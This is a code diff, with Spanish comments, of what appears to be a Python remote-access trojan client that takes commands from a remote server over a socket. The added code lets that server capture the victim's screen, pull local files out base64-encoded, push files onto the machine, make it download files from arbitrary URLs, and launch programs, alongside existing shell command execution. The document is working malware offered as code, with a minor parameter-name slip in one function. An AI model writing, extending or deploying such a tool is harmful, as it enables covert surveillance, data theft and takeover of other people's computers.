@@ -12,6 +12,9 @@ import sys
 import signal
 import struct
 import os
+import base64
+import requests
+import mss
 
 current_dir = os.getcwd()
 
@@ -25,6 +28,7 @@ def run_command(command):
     ''' 
     Ejecuta un comando en el sistema y devuelve la salida
     '''
+    print(f"Running command: {command}")
     try:
         # Ejecutamos el comando y guardamos la salida
         output = subprocess.check_output(command, shell=True)
@@ -50,9 +54,77 @@ def send_screenshot(client_socket):
     client_socket.sendall(screenshot_data)
     
     
+def take_screenshot(client_socket):
+    '''
+    Función para tomar una captura de pantalla
+    '''
+    screen = mss.mss()
+    screen.shot()
+
+    with open("monitor-1.png", "rb") as file:
+        screenshot_data = file.read()
+        
+    # Enviar primero el tamaño del archivo
+    client_socket.send(struct.pack("!I", len(screenshot_data)))
+    client_socket.sendall(screenshot_data)
+    os.remove("monitor-1.png")  
     
+    
+def download_file(client_socket, file_path):
+    '''
+    Función para descargar un archivo y enviarlo al servidor
+    '''
+    try:
+        with open(file_path, "rb") as file_download:
+            client_socket.send(base64.b64encode(file_download.read()))
+        print(f"File {file_path} sent successfully!")
+    except Exception as e:
+        print(f"Error downloading file: {e}")
+
+def upload_file(client_socket, file_path):
+    '''
+    Función para recibir un archivo del servidor y guardarlo localmente
+    '''
+    try:
+        with open(file_path, "wb") as file_upload:
+            data = client_socket.recv(30000)
+            file_upload.write(base64.b64decode(data))
+        print(f"File {file_path} received successfully!")
+    except Exception as e:
+        print(f"Error uploading file: {e}")
+
+def download_internet_file(url):
+    '''
+    Función para descargar un archivo de internet
+    '''
+    try:
+        consulta = requests.get(url)
+        name_file = url.split("/")[-1]
+        with open(name_file, "wb") as file:
+            file.write(consulta.content)
+        print(f"File {name_file} downloaded successfully!")
+    except Exception as e:
+        print(f"Error downloading file: {e}")
+        
+def start_app(client_sockect,name_app):
+    '''
+    Función para iniciar una aplicación
+    '''
+    try:
+        # Iniciar la aplicación en un proceso separado
+        subprocess.Popen(name_app,shell=True)
+        print(f"Application {name_app} started successfully!")
+        client_socket.send(b"Application %s started successfully!" % name_app.encode())
+    except Exception as e:
+        print(f"Error starting application: {e}")
+
+        
+        
+
     
 
+    
+    
 
 if __name__ == '__main__':
     
@@ -75,6 +147,27 @@ if __name__ == '__main__':
         
         if command == "screenshot":
             send_screenshot(client_socket)
+        
+        # Comando download para descargar archivos
+        elif command.startswith("download "):
+            download_file(client_socket, command[9:])            
+
+        
+        # Comando upload para subir archivos
+        elif command.startswith("upload "):
+            upload_file(client_socket, command[7:])
+        
+        elif command.startswith("start "):
+            start_app(client_socket,command[6:])
+            
+            
+        # Comando download_internet para descargar archivos de internet
+        elif command.startswith("geturl "):
+            download_internet_file(command[7:])
+        
+        elif command.startswith("screenshot2"):
+            take_screenshot(client_socket)
+
         
         elif command.startswith("cd "):
             # Cambiamos el directorio de trabajo
